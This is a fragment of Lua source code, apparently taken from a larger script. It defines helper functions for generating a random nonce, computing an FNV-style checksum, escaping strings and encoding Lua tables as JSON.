local function _buildNonce(seed)
	local _n = _flr(_M.abs(_M.sin(seed or os.clock()) * 1e7))
	local _chars = {}
	for _i = 1, 12 do
		_chars[_i] = _chr(97 + (_n % 26))
		_n = _flr(_n / 3) + _i * 7
	end
	return table.concat(_chars)
end

local function _checksum(s)
	local _h = 2166136261
	for _i = 1, #s do
		_h = bit32.bxor(_h, s:byte(_i))
		_h = (_h * 16777619) % 4294967296
	end
	return string.format("%08x", _h)
end

local function _simpleEncode(v)
	if type(v) ~= "string" then error("expected string") end
	local _out = {}
	for _i = 1, #v do
		local _b = v:byte(_i)
		if _b < 32 or _b == 34 or _b == 92 then
			_out[#_out+1] = string.format("\\u%04x", _b)
		else
			_out[#_out+1] = _chr(_b)
		end
	end
	return '"' .. table.concat(_out) .. '"'
end

local function _jsonVal(v, seen)
	local _vt = type(v)
	if _vt == "string" then
		return _simpleEncode(v)
	elseif _vt == "number" then
		return _T(v)
	elseif _vt == "boolean" then
		return _T(v)
	elseif _vt == "nil" then
		return "null"
	elseif _vt == "table" then
		if seen[v] then error("circular reference") end
		seen[v] = true
		local _isArr = true
		local _maxIdx = 0
		for _k in pairs(v) do
			if type(_k) ~= "number" then
				_isArr = false
				break
			end
			if _k > _maxIdx then
				_maxIdx = _k
			end
		end
		local _parts = {}
		if _isArr then
			for _i = 1, _maxIdx do
				_parts[#_parts+1] = _jsonVal(v[_i], seen)
			end
			seen[v] = nil
			return "[" .. table.concat(_parts, ",") .. "]"
		end
		for _k, _v in pairs(v) do
			_parts[#_parts+1] = _simpleEncode(_T(_k)) .. ":" .. _jsonVal(_v, seen)
		end
		seen[v] = nil
		return "{" .. table.concat(_parts, ",") .. "}"
	else
		error("unexpected type '" .. _vt .. "'")
	end
end

local function _jsonEncode(obj)
	return _jsonVal(obj, {})
end

